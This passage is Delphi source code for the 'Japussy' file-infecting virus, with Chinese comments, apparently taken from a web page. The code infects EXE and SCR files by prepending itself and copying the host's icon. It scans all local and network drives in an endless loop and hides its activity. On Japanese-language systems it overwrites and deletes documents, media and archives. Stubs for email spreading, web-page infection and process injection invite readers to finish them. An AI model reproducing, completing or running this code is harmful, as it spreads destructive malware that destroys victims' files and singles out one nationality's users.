_PLATFORM_WIN32_WINDOWS) then //Win9x</span><br><span class="line">Result := True;</span><br><span class="line">end;</span><br><span class="line">&#123; 在流之间复制 &#125;</span><br><span class="line">procedure CopyStream(Src: TStream; sStartPos: Integer; Dst: TStream;</span><br><span class="line">dStartPos: Integer; Count: Integer);</span><br><span class="line">var</span><br><span class="line">sCurPos, dCurPos: Integer;</span><br><span class="line">begin</span><br><span class="line">sCurPos := Src.Position;</span><br><span class="line">dCurPos := Dst.Position;</span><br><span class="line">Src.Seek(sStartPos, 0);</span><br><span class="line">Dst.Seek(dStartPos, 0);</span><br><span class="line">Dst.CopyFrom(Src, Count);</span><br><span class="line">Src.Seek(sCurPos, 0);</span><br><span class="line">Dst.Seek(dCurPos, 0);</span><br><span class="line">end;</span><br><span class="line">&#123; 将宿主文件从已感染的PE文件中分离出来，以备使用 &#125;</span><br><span class="line">procedure ExtractFile(FileName: string);</span><br><span class="line">var</span><br><span class="line">sStream, dStream: TFileStream;</span><br><span class="line">begin</span><br><span class="line">try</span><br><span class="line">sStream := TFileStream.Create(ParamStr(0), fmOpenRead or fmShareDenyNone);</span><br><span class="line">try</span><br><span class="line">dStream := TFileStream.Create(FileName, fmCreate);</span><br><span class="line">try</span><br><span class="line">sStream.Seek(HeaderSize, 0); //跳过头部的病毒部分</span><br><span class="line">dStream.CopyFrom(sStream, sStream.Size - HeaderSize);</span><br><span class="line">finally</span><br><span class="line">dStream.Free;</span><br><span class="line">end;</span><br><span class="line">finally</span><br><span class="line">sStream.Free;</span><br><span class="line">end;</span><br><span class="line">except</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line">&#123; 填充STARTUPINFO结构 &#125;</span><br><span class="line">procedure FillStartupInfo(var Si: STARTUPINFO; State: Word);</span><br><span class="line">begin</span><br><span class="line">Si.cb := SizeOf(Si);</span><br><span class="line">Si.lpReserved := nil;</span><br><span class="line">Si.lpDesktop := nil;</span><br><span class="line">Si.lpTitle := nil;</span><br><span class="line">Si.dwFlags := STARTF_USESHOWWINDOW;</span><br><span class="line">Si.wShowWindow := State;</span><br><span class="line">Si.cbReserved2 := 0;</span><br><span class="line">Si.lpReserved2 := nil;</span><br><span class="line">end;</span><br><span class="line">&#123; 发带毒邮件 &#125;</span><br><span class="line">procedure SendMail;</span><br><span class="line">begin</span><br><span class="line">//哪位仁兄愿意完成之？</span><br><span class="line">end;</span><br><span class="line">&#123; 感染PE文件 &#125;</span><br><span class="line">procedure InfectOneFile(FileName: string);</span><br><span class="line">var</span><br><span class="line">HdrStream, SrcStream: TFileStream;</span><br><span class="line">IcoStream, DstStream: TMemoryStream;</span><br><span class="line">iID: LongInt;</span><br><span class="line">aIcon: TIcon;</span><br><span class="line">Infected, IsPE: Boolean;</span><br><span class="line">i: Integer;</span><br><span class="line">Buf: array[0..1] of Char;</span><br><span class="line">begin</span><br><span class="line">try //出错则文件正在被使用，退出</span><br><span class="line">if CompareText(FileName, &apos;JAPUSSY.EXE&apos;) = 0 then //是自己则不感染</span><br><span class="line">Exit;</span><br><span class="line">Infected := False;</span><br><span class="line">IsPE := False;</span><br><span class="line">SrcStream := TFileStream.Create(FileName, fmOpenRead);</span><br><span class="line">try</span><br><span class="line">for i := 0 to $108 do //检查PE文件头</span><br><span class="line">begin</span><br><span class="line">SrcStream.Seek(i, soFromBeginning);</span><br><span class="line">SrcStream.Read(Buf, 2);</span><br><span class="line">if (Buf[0] = #80) and (Buf[1] = #69) then //PE标记</span><br><span class="line">begin</span><br><span class="line">IsPE := True; //是PE文件</span><br><span class="line">Break;</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line">SrcStream.Seek(-4, soFromEnd); //检查感染标记</span><br><span class="line">SrcStream.Read(iID, 4);</span><br><span class="line">if (iID = ID) or (SrcStream.Size &lt; 10240) then //太小的文件不感染</span><br><span class="line">Infected := True;</span><br><span class="line">finally</span><br><span class="line">SrcStream.Free;</span><br><span class="line">end;</span><br><span class="line">if Infected or (not IsPE) then //如果感染过了或不是PE文件则退出</span><br><span class="line">Exit;</span><br><span class="line">IcoStream := TMemoryStream.Create;</span><br><span class="line">DstStream := TMemoryStream.Create;</span><br><span class="line">try</span><br><span class="line">aIcon := TIcon.Create;</span><br><span class="line">try</span><br><span class="line">//得到被感染文件的主图标(744字节)，存入流</span><br><span class="line">aIcon.ReleaseHandle;</span><br><span class="line">aIcon.Handle := ExtractIcon(HInstance, PChar(FileName), 0);</span><br><span class="line">aIcon.SaveToStream(IcoStream);</span><br><span class="line">finally</span><br><span class="line">aIcon.Free;</span><br><span class="line">end;</span><br><span class="line">SrcStream := TFileStream.Create(FileName, fmOpenRead);</span><br><span class="line">//头文件</span><br><span class="line">HdrStream := TFileStream.Create(ParamStr(0), fmOpenRead or fmShareDenyNone);</span><br><span class="line">try</span><br><span class="line">//写入病毒体主图标之前的数据</span><br><span class="line">CopyStream(HdrStream, 0, DstStream, 0, IconOffset);</span><br><span class="line">//写入目前程序的主图标</span><br><span class="line">CopyStream(IcoStream, 22, DstStream, IconOffset, IconSize);</span><br><span class="line">//写入病毒体主图标到病毒体尾部之间的数据</span><br><span class="line">CopyStream(HdrStream, IconTail, DstStream, IconTail, HeaderSize - IconTail);</span><br><span class="line">//写入宿主程序</span><br><span class="line">CopyStream(SrcStream, 0, DstStream, HeaderSize, SrcStream.Size);</span><br><span class="line">//写入已感染的标记</span><br><span class="line">DstStream.Seek(0, 2);</span><br><span class="line">iID := $44444444;</span><br><span class="line">DstStream.Write(iID, 4);</span><br><span class="line">finally</span><br><span class="line">HdrStream.Free;</span><br><span class="line">end;</span><br><span class="line">finally</span><br><span class="line">SrcStream.Free;</span><br><span class="line">IcoStream.Free;</span><br><span class="line">DstStream.SaveToFile(FileName); //替换宿主文件</span><br><span class="line">DstStream.Free;</span><br><span class="line">end;</span><br><span class="line">except;</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line"> </span><br><span class="line">&#123; 将目标文件写入垃圾码后删除 &#125;</span><br><span class="line">procedure SmashFile(FileName: string);</span><br><span class="line">var</span><br><span class="line">FileHandle: Integer;</span><br><span class="line">i, Size, Mass, Max, Len: Integer;</span><br><span class="line">begin</span><br><span class="line">try</span><br><span class="line">SetFileAttributes(PChar(FileName), 0); //去掉只读属性</span><br><span class="line">FileHandle := FileOpen(FileName, fmOpenWrite); //打开文件</span><br><span class="line">try</span><br><span class="line">Size := GetFileSize(FileHandle, nil); //文件大小</span><br><span class="line">i := 0;</span><br><span class="line">Randomize;</span><br><span class="line">Max := Random(15); //写入垃圾码的随机次数</span><br><span class="line">if Max &lt; 5 then</span><br><span class="line">Max := 5;</span><br><span class="line">Mass := Size div Max; //每个间隔块的大小</span><br><span class="line">Len := Length(Catchword);</span><br><span class="line">while i &lt; Max do</span><br><span class="line">begin</span><br><span class="line">FileSeek(FileHandle, i * Mass, 0); //定位</span><br><span class="line">//写入垃圾码，将文件彻底破坏掉</span><br><span class="line">FileWrite(FileHandle, Catchword, Len);</span><br><span class="line">Inc(i);</span><br><span class="line">end;</span><br><span class="line">finally</span><br><span class="line">FileClose(FileHandle); //关闭文件</span><br><span class="line">end;</span><br><span class="line">DeleteFile(PChar(FileName)); //删除之</span><br><span class="line">except</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line">&#123; 获得可写的驱动器列表 &#125;</span><br><span class="line">function GetDrives: string;</span><br><span class="line">var</span><br><span class="line">DiskType: Word;</span><br><span class="line">D: Char;</span><br><span class="line">Str: string;</span><br><span class="line">i: Integer;</span><br><span class="line">begin</span><br><span class="line">for i := 0 to 25 do //遍历26个字母</span><br><span class="line">begin</span><br><span class="line">D := Chr(i + 65);</span><br><span class="line">Str := D + &apos;:&apos;;</span><br><span class="line">DiskType := GetDriveType(PChar(Str));</span><br><span class="line">//得到本地磁盘和网络盘</span><br><span class="line">if (DiskType = DRIVE_FIXED) or (DiskType = DRIVE_REMOTE) then</span><br><span class="line">Result := Result + D;</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line">&#123; 遍历目录，感染和摧毁文件 &#125;</span><br><span class="line">procedure LoopFiles(Path, Mask: string);</span><br><span class="line">var</span><br><span class="line">i, Count: Integer;</span><br><span class="line">Fn, Ext: string;</span><br><span class="line">SubDir: TStrings;</span><br><span class="line">SearchRec: TSearchRec;</span><br><span class="line">Msg: TMsg;</span><br><span class="line">function IsValidDir(SearchRec: TSearchRec): Integer;</span><br><span class="line">begin</span><br><span class="line">if (SearchRec.Attr &lt;&gt; 16) and (SearchRec.Name &lt;&gt; &apos;.&apos;) and</span><br><span class="line">(SearchRec.Name &lt;&gt; &apos;..&apos;) then</span><br><span class="line">Result := 0 //不是目录</span><br><span class="line">else if (SearchRec.Attr = 16) and (SearchRec.Name &lt;&gt; &apos;.&apos;) and</span><br><span class="line">(SearchRec.Name &lt;&gt; &apos;..&apos;) then</span><br><span class="line">Result := 1 //不是根目录</span><br><span class="line">else Result := 2; //是根目录</span><br><span class="line">end;</span><br><span class="line">begin</span><br><span class="line">if (FindFirst(Path + Mask, faAnyFile, SearchRec) = 0) then</span><br><span class="line">begin</span><br><span class="line">repeat</span><br><span class="line">PeekMessage(Msg, 0, 0, 0, PM_REMOVE); //调整消息队列，避免引起怀疑</span><br><span class="line">if IsValidDir(SearchRec) = 0 then</span><br><span class="line">begin</span><br><span class="line">Fn := Path + SearchRec.Name;</span><br><span class="line">Ext := UpperCase(ExtractFileExt(Fn));</span><br><span class="line">if (Ext = &apos;.EXE&apos;) or (Ext = &apos;.SCR&apos;) then</span><br><span class="line">begin</span><br><span class="line">InfectOneFile(Fn); //感染可执行文件</span><br><span class="line">end</span><br><span class="line">else if (Ext = &apos;.HTM&apos;) or (Ext = &apos;.HTML&apos;) or (Ext = &apos;.ASP&apos;) then</span><br><span class="line">begin</span><br><span class="line">//感染HTML和ASP文件，将Base64编码后的病毒写入</span><br><span class="line">//感染浏览此网页的所有用户</span><br><span class="line">//哪位大兄弟愿意完成之？</span><br><span class="line">end</span><br><span class="line">else if Ext = &apos;.WAB&apos; then //Outlook地址簿文件</span><br><span class="line">begin</span><br><span class="line">//获取Outlook邮件地址</span><br><span class="line">end</span><br><span class="line">else if Ext = &apos;.ADC&apos; then //Foxmail地址自动完成文件</span><br><span class="line">begin</span><br><span class="line">//获取Foxmail邮件地址</span><br><span class="line">end</span><br><span class="line">else if Ext = &apos;IND&apos; then //Foxmail地址簿文件</span><br><span class="line">begin</span><br><span class="line">//获取Foxmail邮件地址</span><br><span class="line">end</span><br><span class="line">else</span><br><span class="line">begin</span><br><span class="line">if IsJap then //是倭文操作系统</span><br><span class="line">begin</span><br><span class="line">if (Ext = &apos;.DOC&apos;) or (Ext = &apos;.XLS&apos;) or (Ext = &apos;.MDB&apos;) or</span><br><span class="line">(Ext = &apos;.MP3&apos;) or (Ext = &apos;.RM&apos;) or (Ext = &apos;.RA&apos;) or</span><br><span class="line">(Ext = &apos;.WMA&apos;) or (Ext = &apos;.ZIP&apos;) or (Ext = &apos;.RAR&apos;) or</span><br><span class="line">(Ext = &apos;.MPEG&apos;) or (Ext = &apos;.ASF&apos;) or (Ext = &apos;.JPG&apos;) or</span><br><span class="line">(Ext = &apos;.JPEG&apos;) or (Ext = &apos;.GIF&apos;) or (Ext = &apos;.SWF&apos;) or</span><br><span class="line">(Ext = &apos;.PDF&apos;) or (Ext = &apos;.CHM&apos;) or (Ext = &apos;.AVI&apos;) then</span><br><span class="line">SmashFile(Fn); //摧毁文件</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line">//感染或删除一个文件后睡眠200毫秒，避免CPU占用率过高引起怀疑</span><br><span class="line">Sleep(200);</span><br><span class="line">until (FindNext(SearchRec) &lt;&gt; 0);</span><br><span class="line">end;</span><br><span class="line">FindClose(SearchRec);</span><br><span class="line">SubDir := TStringList.Create;</span><br><span class="line">if (FindFirst(Path + &apos;*.*&apos;, faDirectory, SearchRec) = 0) then</span><br><span class="line">begin</span><br><span class="line">repeat</span><br><span class="line">if IsValidDir(SearchRec) = 1 then</span><br><span class="line">SubDir.Add(SearchRec.Name);</span><br><span class="line">until (FindNext(SearchRec) &lt;&gt; 0);</span><br><span class="line">end;</span><br><span class="line">FindClose(SearchRec);</span><br><span class="line">Count := SubDir.Count - 1;</span><br><span class="line">for i := 0 to Count do</span><br><span class="line">LoopFiles(Path + SubDir.Strings + &apos;&apos;, Mask);</span><br><span class="line">FreeAndNil(SubDir);</span><br><span class="line">end;</span><br><span class="line">&#123; 遍历磁盘上所有的文件 &#125;</span><br><span class="line">procedure InfectFiles;</span><br><span class="line"> </span><br><span class="line">var</span><br><span class="line">DriverList: string;</span><br><span class="line">i, Len: Integer;</span><br><span class="line">begin</span><br><span class="line">if GetACP = 932 then //日文操作系统</span><br><span class="line">IsJap := True; //去死吧！</span><br><span class="line">DriverList := GetDrives; //得到可写的磁盘列表</span><br><span class="line">Len := Length(DriverList);</span><br><span class="line">while True do //死循环</span><br><span class="line">begin</span><br><span class="line">for i := Len downto 1 do //遍历每个磁盘驱动器</span><br><span class="line">LoopFiles(DriverList + &apos;:&apos;, &apos;*.*&apos;); //感染之</span><br><span class="line">SendMail; //发带毒邮件</span><br><span class="line">Sleep(1000 * 60 * 5); //睡眠5分钟</span><br><span class="line">end;</span><br><span class="line">end;</span><br><span class="line">&#123; 主程序开始 &#125;</span><br><span class="line">begin</span><br><span class="line">if IsWin9x then //是Win9x</span><br><span class="line">RegisterServiceProcess(GetCurrentProcessID, 1) //注册为服务进程</span><br><span class="line">else //WinNT</span><br><span class="line">begin</span><br><span class="line">//远程线程映射到Explorer进程</span><br><span class="line">//哪位兄台愿意完成之？</span><br><span class="line">end;</span><br><span class="line">//如果是原始病毒体自己</span><br><span class="line">if CompareText(ExtractFileName(ParamStr(0)), &apos;Japussy.exe&apos;) = 0 then</span><br><span class="line">InfectFiles //感染和发邮件</span><br><span class="line">else //已寄生于宿主程序上了，开始工作</span><br><span class="line">begin</span><br><span class="line">TmpFile := ParamStr(0); //创建临时文件</span><br><span class="line">Delete(TmpFile, Length(TmpFile) - 4, 4);</span><br><span class="line">TmpFile := TmpFile + #32 + &apos;.exe&apos;; //真正的宿主文件，多一个空格</span><br><span class="line">ExtractFile(TmpFile); //分离之</span><br><span class="line">FillStartupInfo(Si, SW_SHOWDEFAULT);</span><br><span class="line">CreateProcess(PChar(TmpFile), PChar(TmpFile), nil, nil, True,</span><br><span class="line">0, nil, &apos;.&apos;, Si, Pi); //创建新进程运行之</span><br><span class="line">InfectFiles; //感染和发邮件</span><br><span class="line">end;</span><br><span class="line">end.</span><br></pre></td></tr></table></figure>
